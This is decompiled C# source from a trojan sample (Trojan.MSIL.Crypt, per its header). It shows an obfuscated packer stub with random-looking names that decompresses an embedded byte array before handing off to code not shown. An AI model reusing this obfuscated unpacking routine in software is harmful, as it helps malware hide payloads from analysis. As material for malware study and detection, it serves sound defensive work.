// Decompiled with JetBrains decompiler
// Type: YmetSyaloGBBVwb
// Assembly: done, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A69B6AA6-B9E8-43FA-9638-4048BEC3E938
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Crypt.fxo-621b7858e71aa20ea71f1f491bcaf9435e9ac472b17525dfc53747d223674acb.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;

[StandardModule]
public sealed class YmetSyaloGBBVwb
{
  [STAThread]
  public static void Main() => OEXKgAoqBomGpBu.YDjTRZVMKhYbiJL();

  public static byte[] qHxjjgzyNyAaVsh(byte[] laPsKWvsUcdWSzz)
  {
    byte[] numArray;
    try
    {
      numArray = YmetSyaloGBBVwb.uZxJrkMjeuUxksT((Stream) new DeflateStream((Stream) new MemoryStream(laPsKWvsUcdWSzz), CompressionMode.Decompress, true), laPsKWvsUcdWSzz.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] uZxJrkMjeuUxksT(Stream WNzLNXypbZCtgoD, int exHoeLbIIUAcgcq)
  {
    int offset = 0;
    byte[] numArray1;
    try
    {
      byte[] numArray2;
      while (true)
      {
        numArray2 = (byte[]) Utils.CopyArray((Array) numArray2, (Array) new byte[checked (offset + exHoeLbIIUAcgcq + 1)]);
        int num = WNzLNXypbZCtgoD.Read(numArray2, offset, exHoeLbIIUAcgcq);
        if (num != 0)
          checked { offset += num; }
        else
          break;
      }
      numArray1 = (byte[]) Utils.CopyArray((Array) numArray2, (Array) new byte[checked (offset - 1 + 1)]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray1 = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray1;
  }
}
